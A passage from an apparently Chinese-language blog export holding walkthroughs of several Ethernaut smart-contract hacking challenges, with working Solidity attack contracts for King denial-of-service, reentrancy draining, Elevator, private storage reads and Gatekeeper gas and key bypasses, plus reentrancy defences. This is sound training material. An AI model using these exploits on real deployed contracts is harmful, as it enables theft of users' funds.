合约接收到转账的时候，会校验转账金额，通过校验的话，则向当前 King 退款并设置新的 King。我们的任务就是阻止新的 King 的设置，那么使得 King 合约执行到 king.transfer(msg.value) 时 revert 即可。当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放：攻击合约如下，不设置 payable 的 fallback 函数或者在 fallback 函数中 revert 都可以。 pragma solidity ^0.4.18; contract attack{ function attack(address _addr) public payable{ _addr.call.gas(10000000).value(msg.value)(); }//先给合约一些钱,使得我们成为king function () public { revert();//在 fallback 函数中 revert } } 攻击流程：1、获取实例，需要支付1ETH 2、查看玩家地址，合约地址，国王地址，国王金额，prize值 3、部署攻击合约 查看攻击合约地址，再次查看king地址，就变成了我们攻击合约的地址了： 4、提交实例，检查结果","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Re-Entrancy第10关练习","slug":"10.Ethernaut-Re-entrancy","date":"2021-07-21T06:45:00.000Z","updated":"2021-08-02T08:27:30.396Z","comments":true,"path":"/Ethernaut/10.Ethernaut-Re-entrancy/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/10.Ethernaut-Re-entrancy/","excerpt":"","text":"Re-entrancy第10关练习要求：此级别的目标是让您从合约中窃取所有资金。 可能有帮助的事情： 不受信任的合约可以在您最不期望的地方执行代码。 回退方法 抛出/恢复冒泡 有时，攻击合同的最佳方式是使用另一份合同。 “超越控制台”部分 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); }//捐赠 function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; }//查看余额 function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) {//提现金额要大于余额 (bool result, bytes memory data) = msg.sender.call.value(_amount)(\"\"); if(result) { _amount; }//提现 balances[msg.sender] -= _amount; }//但是这里是完成交易之后再从账户里面把提现的金额减去 } fallback() external payable {} } 合约分析：从上面的源代码可以确定这里应该为以太坊里的重入攻击，这也是之前The DAO事件里黑客所用到的攻击。在这里我们重点来看withdraw函数，我们可以看到它接收了一个amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，同样利用的是我们熟悉的fallback函数来实现。 当然，这里还有另外一个关键的地方——call.value函数特性，当我们使用call.value()来调用代码时，执行的代码会被赋予账户所有可用的gas,这样就能保证我们的fallback函数能被顺利执行，对应的，如果我们使用transfer和send函数来发送时，代码可用的gas仅有2300而已，这点gas可能仅仅只够捕获一个event，所以也将无法进行可重入攻击，因为send本来就是transfer的底层实现，所以他两性质也差不多。 因为他是提现完成之后才修改账户余额的，可以使用重入攻击 另外常用转币方式有三种，题目中用了第三种方法 .reansfer() 发送失败时会通过 throw 回滚状态，只会传递 2300 个 gas 以供调用，从而防止重入 .send() 发送失败时，返回布尔值 false，只会传递 2300 个 gas 以供调用，从而防止重入 .gas().call.value()() 当发送失败时，返回布尔值 false 将传递所有可用的 gas 进行调用（可通过 gas(gas _value) 进行限制），不能有效防止重入攻击 使用的EXP代码： pragma solidity ^0.4.18; contract Reentrance { mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] += msg.value; }//捐赠 function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; }//查看余额 function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { if(msg.sender.call.value(_amount)()) { _amount; }//提现 balances[msg.sender] -= _amount; } } function() public payable {} } contract Attack { address instance_address = 0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D; Reentrance target = Reentrance(instance_address); function Attack() public payable{} function donate() public payable { target.donate.value(msg.value)(this); }//首先,需要捐赠一些钱,满足withdraw的要求 function hack() public { target.withdraw(0.5 ether); }//然后调用合约的withdraw函数提现 function get_balance() public view returns(uint) { return target.balanceOf(this); } function my_eth_bal() public view returns(uint) { return address(this).balance; } function ins_eth_bal() public view returns(uint) { return instance_address.balance; } function () public payable { target.withdraw(0.5 ether); }//因为我们接受以太币的时候也会调用我们的回退函数 //而我们的回退函数中又一次调用了题目合约的withdraw函数 } 攻击流程：1、获取实例，查看合约地址，合约余额 2、在remix中部署合约，编译之后将合约部署到网络上，此时查看，可以看到 balance 为 0 Reentrance 账户余额 1 ether Attack 账户余额 0 ether 然后调用donate函数，我们需要在受攻击的合约里给我们的攻击合约地址增加一些balance以完成withdraw第一步的检查：首先在value处填写1 ether；以攻击者合约的身份向题目地址转账 1 ether； balance 为 1 ether Reentrance 账户余额 2 ether Attack 账户余额 0 ether 3、然后开始攻击，点击hack，成功以后观察： 到这里题目算是完成了，提交就行，但是没太能够理解，那就来复盘几次吧 攻击的思路依然是在fallback函数上做文章：在账户被修改余额前不断递归调用此函数，造成了银行账户被取光的效果。为了巩固对这个漏洞的理解，我们回头去看第一关，Fallback。 这里使用另一种方法进行donate，好吧，其实之前语法弄错，自己再来一次 通过控制台进行donate使用，语法参考web3.js，需要规范一下，不然会报错 contract.donate.sendTransaction('0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D',{value: web3.utils.toWei('1', 'ether')}) 之前直接使用这个toWei 报了格式的错误 contract.donate.sendTransaction(\"0xeE59e9DC270A52477d414f0613dAfa678Def4b02\",{value: toWei(1)}) “web3.js的单位” 加到0.5eth再执行上面的hack,观察到余额变为0，快乐提交 防御措施：1、在可能的情况下，将ether发送给外部地址时使用solidity内置的transfer()函数，transfer()转账时只发送2300gas，不足以调用另一份合约(即重入发送合约)，使用transfer()重写原合约的withdrawFunds()如下； function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { msg.sender.transfer(_amount); balances[msg.sender] -= _amount; } } 2、确保状态变量改变发生在ether被发送(或者任何外部调用)之前，即Solidity官方推荐的检查-生效-交互模式(checks-effects-interactions); function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) {//检查 balances[msg.sender] -= _amount;//生效 msg.sender.transfer(_amount);//交互 } } 3、使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，防止重入调用 bool reEntrancyMutex = false; function withdraw(uint _amount) public { require(!reEntrancyMutex); reEntrancyMutex = true; if(balances[msg.sender] &gt;= _amount) { if(msg.sender.call.value(_amount)()) { _amount; } balances[msg.sender] -= _amount; reEntrancyMutex = false; } } 重入在这次攻击中发挥了重要作用，最终导致Ethereum Classic(ETC)的分叉，有关The DAO漏洞的详细分析，可参考下面这篇文章： Analysis of the DAO exploithackingdistributed.com 4、OpenZeppelin官方库 OpenZeppelin/openzeppelin-contractsgithub.com // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; /** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */ abstract contract ReentrancyGuard { // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and // pointer aliasing, and it cannot be disabled. // The values being non-zero value makes deployment a bit more expensive, // but in exchange the refund on every call to nonReentrant will be lower in // amount. Since refunds are capped to a percentage of the total // transaction's gas, it is best to keep them low in cases like this one, to // increase the likelihood of the full refund coming into effect. uint256 private constant _NOT_ENTERED = 1; uint256 private constant _ENTERED = 2; uint256 private _status; constructor () { _status = _NOT_ENTERED; } /** * @dev Prevents a contract from calling itself, directly or indirectly. * Calling a `nonReentrant` function from another `nonReentrant` * function is not supported. It is possible to prevent this from happening * by making the `nonReentrant` function external, and make it call a * `private` function that does the actual work. */ modifier nonReentrant() { // On the first call to nonReentrant, _notEntered will be true require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\"); // Any calls to nonReentrant after this point will fail _status = _ENTERED; _; // By storing the original value once again, a refund is triggered (see // https://eips.ethereum.org/EIPS/eip-2200) _status = _NOT_ENTERED; } }","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Elevator第11关练习","slug":"11.Ethernaut-Elevator","date":"2021-07-21T02:27:00.000Z","updated":"2021-08-02T08:27:30.397Z","comments":true,"path":"/Ethernaut/11.Ethernaut-Elevator/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/11.Ethernaut-Elevator/","excerpt":"","text":"Elevator第11关练习要求：这台电梯不会让您到达建筑物的顶部。对吗？ 有时候，固执并不擅长守承诺。 这期望从.Elevator``Building 目标：成为 top，让变量 top 变为 true 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); }//定义了一个接口,这个函数返回你是不是在最顶层 contract Elevator { bool public top;//布尔型变量,是否是top,默认false uint public floor;//楼层 function goTo(uint _floor) public { Building building = Building(msg.sender);//如果不是最顶层的话就进入if if (! building.isLastFloor(_floor)) { floor = _floor;//拿到你的_floor top = building.isLastFloor(floor);//让top等于判断结果,所以还是false }//但是如果你是top的话,没有改top的机会,所以还是false } } 合约分析：在合约的开头处有一个Building接口，定义了isLastFloor函数，返回值是bool，应该是用来返回这一楼层是否为最顶层，在接口里没有函数是已实现的，类似于抽象合约，可以理解为它仅仅用来提供一个标准，这样继承于它的合约就可以遵照它的标准来进行交互，而接口内的函数在其调用合约内定义即可。 之后在下面的主合约里，定义了一个bool型的top变量，在goto函数里对传入的_floor变量进行了判断，从逻辑上我们发现判断的条件里如果isLastFloor返回false，通过if后再将isLastFloor的返回值赋给top，这样的话我们的top还是个false，而这里我们要想让top的值变为true，那么我们得想个办法在isLastFloor上动动手脚，由于goTo函数调用了两次isLastFloor，因此我们可以将该函数构造为取反函数即可： pragma solidity ^0.4.18; interface Building { function isLastFloor(uint) external returns (bool); }//定义了一个接口,这个函数返回你是不是在最顶层 contract Elevator { bool public top;//布尔型变量,是否是top,默认false uint public floor;//楼层 function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) {//如果不是最顶层的话就进入if floor = _floor;//拿到你的_floor top = building.isLastFloor(floor);//让top等于判断结果,所以还是false }//但是如果你是top的话,没有改top的机会,所以还是false } } contract BuildingEXP{ Elevator ele; bool t = true;//一开始定义为true function isLastFloor(uint) view public returns (bool) { t = !t;//在if那个地方要为false进入 //在top那个地方再次反转为false,这样就能保证top一直都是true啦 return t; } function attack(address _addr) public{ ele = Elevator(_addr); ele.goTo(5); } } 攻击流程：1、获取实例，查看合约地址，顶层bool值，还有floor 2、部署合约 发现有一处warning，是因为view产生的，因为在 view 函数中强行改属性也是可以通过编译的，所以可以忽略，有兴趣可以自行将view修改成payable或者no-payable也行 将合约地址进行传参，点击attack 可以看到我们的top变成了true，floor变成了5 3、这时候top就一直是顶层了，快乐提交就行","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Privacy第12关练习","slug":"12.Ethernaut-Privacy","date":"2021-07-20T10:13:00.000Z","updated":"2021-08-02T08:27:30.397Z","comments":true,"path":"/Ethernaut/12.Ethernaut-Privacy/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/12.Ethernaut-Privacy/","excerpt":"","text":"Privacy第12关练习要求：这份合约的创建者非常小心，以保护其存储的敏感区域。 解锁此合约以通关。 可能有帮助的事情： 了解存储的工作原理 了解参数解析的工作原理 了解铸造的工作原理 提示： 请记住，metamask 只是一种商品。如果出现问题，请使用其他工具。高级游戏可能涉及使用 remix 或您自己的 web3 提供商。 目标：解锁需要一个 key，而这个 key 是 data[2] 是 private 的 在区块链上面没有私密的东西，都是公开的，只要找到就能过关 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } 合约分析：根据solidity 文档中的变量存储原则：静态大小的变量（除 映射mapping 和动态数组之外的所有类型）都从位置 0 开始连续放置在 存储storage 中。如果可能的话，存储需求少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下： 存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。 基本类型仅使用存储它们所需的字节。 如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。 结构（struct）和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。 存储storage 中的状态变量储存结构 例如，按照 uint128，uint128，uint256 的顺序声明你的存储变量，而不是 uint128，uint256，uint128， 因为前者只占用两个 存储插槽storage slot，而后者将占用三个。 分析一下合约中的变量： // 1 byte, slot 0 bool public locked = true; // 32 bytes, slot 1 uint256 public ID = block.timestamp; // 1 byte, slot 2 uint8 private flattening = 10; // 1 byte, slot 2 uint8 private denomination = 255; // 2 byte, slot 2 uint16 private awkwardness = uint16(now); // bytes32[0], 32 bytes, slot 3; bytes32[1], 32 bytes, slot 4; bytes32[2], 32 bytes, slot 5 bytes32[3] private data; 第一个变量是一个bool值占1个byte，和一个slot，按顺序下一个变量ID占有32个bytes，所以需要单独占一个存储插槽storage slot ，变量flattening,denomination,awkwardness加起来占有32bytes，所以他们3个变量占用一个存储槽，最后是3个32bytes的变量，各占一个。因为 function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } 我们所需要的data[2]就是存在于第六个slot中也就是slot 5中，取出的方法有： await web3.eth.getStorageAt(instance, 5); web3.eth.getStorageAt(instance,5,function(x,y){alert(y);}) web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);}) 最后我们调用函数unlock即可解锁 需要注意的是，要解锁合约的 _key 是 bytes16 类型的，而 data 是 bytes32 类型的，bytes32 转换到 bytes 16 会截断超出的 bytes，也就是我们只取前 16 个 bytes 就好。 攻击流程：1、获取实例，查看锁状态 2、将第六个存储槽内容取出，slot5： web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);}) 4、调用unlock函数解锁，应为它限定了是byte16所以他自己会截断，也可以手动取16bytes数据 5、为了更加直观的看到存储情况，我们将其一一打印出来对照 还可以观察发现变量flattening = 10 ,和denomination = 255在里面存储着 6、好了，玩的差不多，快乐提交吧，对了，网上有些地方过关的方法可能错误，多尝试，仔细甄别哦，理解原理才是关键","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Gatekeeper One第13关练习","slug":"13.Ethernaut-Gatekeeper One","date":"2021-07-20T07:59:00.000Z","updated":"2021-08-02T08:27:30.398Z","comments":true,"path":"/Ethernaut/13.Ethernaut-Gatekeeper One/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/13.Ethernaut-Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One第13关练习要求：通过守门员并注册为进入者以通过此级别。 绕过三个 gate 来执行 enter 函数 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _;//要求tx.origin不等于请求者，通过其他合约调用实现绕过 } modifier gateTwo() { require(gasleft().mod(8191) == 0); _;//gas要满足8191取余为0 } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\"); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\"); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\"); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 合约分析：从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件，先说第一步和第三步：1、gateOne ：通过其他合约来进行调用即可使得msg.sender和tx.origin不等绕过，假设用户通过合约A调用合约B： 对于合约A：tx.origin和msg.sender都是用户 对于合约B：tx.origin是用户，msg.sender是合约A的地址 3、gateThree() ： modifier gateThree(bytes8 _gateKey) { require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; } 先看最后一个判断 tx.origin 是最初的调用者，就是我们的账户，uint16 是最后 8 字节，要与 uint32 的 key 也就是最后 16 字节相等，所以 key 的最后 8 字节就是 tx.origin 的最后 8 字节 同时如果第一个条件 uint32 的 key 要与 uint16 的 key 相等，所以 key 的 uint32 类型 16 字节前面的八个字节要全为 0 再看中间那个，key 的后 16 字节还不能和整个 32 字节相等，前面只要不是 0 就不会相等 uint16(address) 的转换会保留 address 最后两个字节，由上述 1，3 可得，uint32(uint64(_gateKey)) 等于 uint32(tx.origin) &amp; 0x0000FFFF。再结合上述 2，只要 _gateKey 的最后 4 个字节为 uint32(tx.origin) &amp; 0x0000FFFF，其前面的 4 个字节可以为全 0 外的任意值。我们这里直接取 player 地址的最后八个字节，然后将 tx.origin 倒数三四字节换成 0000 得到 _gateKey。 综上，key 如果是bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF的话就正好可以 2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完 msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript VM环境下进行Debug可在Step detail 栏中可以看到这个变量，我们尝试在VM中进行调试一下： pragma solidity ^0.4.18; contract GatekeeperOne { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _;//可以部署一个中间合约来调用绕过 } modifier gateTwo() { require(msg.gas % 8191 == 0); _;//gas要满足8191取余为0 } modifier gateThree(bytes8 _gateKey) { require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } contract MyAgent { GatekeeperOne c; function MyAgent(address _c) public { c = GatekeeperOne(_c); } function exploit() public { bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff; c.enter.gas(81910)(_gateKey); } } 使用这个代码在remix中运行，编译成功 先获取到合约地址 将合约地址复制给MyAgent中去进行Deploy 直接exploit，报错，然后点击debug，注意，这里我们是为了得到执行到第二步的gas查看的 通过将游标移动到大致这个位置，目的是找到GAS和DUP2这两个地方，GAS关键字是获取执行可用的gas。由于EVM是栈虚拟机，因此此处需要注意获取到的gas后的dup2，dup2是将栈内的第2个元素（从栈顶向下算）移至栈顶。查看他们Step details中的gas和remaining gas，其中gas表示这一小步到下一小步需要的gas使用量，remaining gas表示gas的剩余量，而我们所需要的msg.gas就是remaining gas。 也就是说我们从最开始给到的gas，81910，执行到我们的第二步使用了81910-81695=215的gas，这里妙就妙在81910本身就是8191的倍数，只要我们如果我们想要让这一步结束之后 remaining gas % 8191 = 0 的话，或者说想要让他执行完之后刚好是 81910 的话，就需要让之前的值为：213+2+81910。所以想要绕过第二个关卡的话，值应该是 213+2+81910。这时候我们只需要把代码中给到的gas修改成81910+215=82125就可以，让我们来验证一下 entrant 已经从 0x0000000000000000000000000000000000000000 变为你的 player 地址，测试成功，开启实战吧 攻击流程：1、获取新实例，查看玩家地址，合约地址，查看entrant当前数值 2、直接使用相同的合约，复制合约地址给攻击合约进行编译，但是这里存在一个问题，我们并不知道通过remix上链和到达我们所需要的GAS的时候到底需要多少gas，这里需要测试几下。直接编译上链exploit点击exploit会失败，我们去钱包里面找到失败的交易 去etherscan上查看，点击右上角小标中的GETH调试追溯 、 找到GAS，并且分析整个上链执行的过程并记录 几组数据观察可以发现，21064和5042可能是上链或者链上数据使用的gas，而从step[101]到GAS中间始终是252，step[101]正好是我们合约中所输入的gas，（第二组数据可能是因为我修改了gaslimit太小产生的溢出出错，这些都不重要），我们只要让[101]中的数等于81910+2+252=82164即可（注意这里需要加2，因为gas走到下一步需要2的gas）于是修改gas数值 部署合约，地址，编译，攻击，成功！！！ 3、检查结果，快乐提交！","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Gatekeeper Two第14关练习","slug":"14.Ethernaut-Gatekeeper Two","date":"2021-07-20T05:19:00.000Z","updated":"2021-08-02T08:27:30.399Z","comments":true,"path":"/Ethernaut/14.Ethernaut-Gatekeeper Two/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/14.Ethernaut-Gatekeeper%20Two/","excerpt":"","text":"Gatekeeper Two第14关练习要求：通过看门人的三道检查，成为进入者(entrant)。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 合约分析：gateOne()：我们可以用第三方合约来调用 enter() 实现绕过 gateTwo()：gateTwo中extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 EXTCODESIZE() 返回为 0。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。 gateThree()：传入一个八字节的 key，把 msg.sender 的 hash 计算出来与 uint64 类型的 key 异或，要等与 0-1，也就是 0xFFFFFFFFFFFFFFFF，只要我们先用 uint64(keccak256(msg.sender)) 与 0xFFFFFFFFFFFFFFFF 进行异或，这样再次异或的时候就成了 0xFFFFFFFFFFFFFFFF，也就符合条件了（优先级为 – 大于 ^ 大于 ==）最后攻击合约如下： pragma solidity ^0.4.25; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller) } //用内联汇编来获取调用方caller的代码大小 require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } contract HackGateTwo { constructor(address _addr) public { bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); (bool success, ) = _addr.call(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey)); require(success); } } 要注意使用constructor函数，以下两个同理： contract HackGateTwo { constructor(address _addr) public { bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); (bool success, ) = _addr.call(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey)); require(success); } } contract Attack { GatekeeperTwo target = GatekeeperTwo(instance_address); constructor(address instance_address) public { target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1))); } } 攻击流程：1、获取新实例，查看合约信息，合约地址，合约entrant() 2、部署合约，将合约地址复制到攻击合约中编译执行 3、查看 entrant 发现已经发生变化，说明攻击成功，提交即可过关。","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Naught Coin第15关练习","slug":"15.Ethernaut-Naught Coin","date":"2021-07-20T02:51:00.000Z","updated":"2021-08-02T08:27:30.398Z","comments":true,"path":"/Ethernaut/15.Ethernaut-Naught Coin/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/15.Ethernaut-Naught%20Coin/","excerpt":"","text":"Naught Coin第15关练习要求：NaughtCoin 是一个标准的 ERC20 token 合约，并且你已经拥有了所有的 token。但是问题是，需要10年后才能够执行 transfer 将 token 转移。现在你的目标是突破限制，将所有 token 转移到别的地址，使用合约中你的 token 余额变为 0。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now &gt; timeLock); _; } else { _; } } } 合约分析：根据题意，需要将自己的 balance 清空。合约里提供了 transfer() 函数来进行转账操作，但注意到有一个 modifier lockTokens()，限制了只有十年后才能调用 transfer() 函数。需要解题者 bypass it，注意到该合约是 StandardToken 的子合约，以上代码我们可以看出合约NaughtCoin继承了StandardToken但是没有对父合约做重写，导致利用父合约的函数可以进行及时转账。而子合约NaughtCoin也没有什么问题，那我们还是回过头来看看import的父合约 StandardToken.sol。题目中也给出了源码库地址与 ERC20 接口规范文档https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contractshttps://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md 在子合约中找不出更多信息的时候，把目光更多放到父合约和接口上，在接口规范里能看到，除了 transfer() 之外，还有 transferFrom() 函数也可以进行转账操作。重写transferFrom就是一个可利用的点。直接看看StandardToken.sol代码： contract StandardToken { using ERC20Lib for ERC20Lib.TokenStorage; ERC20Lib.TokenStorage token; ... function transfer(address to, uint value) returns (bool ok) { return token.transfer(to, value); } function transferFrom(address from, address to, uint value) returns (bool ok) { return token.transferFrom(from, to, value); } ... } 跟进ERC20Lib.sol： library ERC20Lib { ... function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) { self.balances[msg.sender] = self.balances[msg.sender].minus(_value); self.balances[_to] = self.balances[_to].plus(_value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) { var _allowance = self.allowed[_from](msg.sender); self.balances[_to] = self.balances[_to].plus(_value); self.balances[_from] = self.balances[_from].minus(_value); self.allowed[_from](msg.sender) = _allowance.minus(_value); Transfer(_from, _to, _value); return true; } ... function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) { self.allowed[msg.sender](_spender) = _value; Approval(msg.sender, _spender, _value); return true; } } 需要注意的是，与 transfer() 不同，调用 transferFrom() 需要 msg.sender 获得授权。由于我们本就是合约的 owner，可以自己给自己授权。授权操作在接口文档里也有 function approve(address _spender, uint256 _value) returns (bool success) 此处可以直接调用这个transferFrom了。但是transferFrom有一步权限验证，要验证这个msg.sender是否被_from（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用approve 给自己授权。 部署完成后复制合约地址，直接在题目界面 console 操作，需要注意toWei语句表达方式，默认单位是ether web3.js toWei await 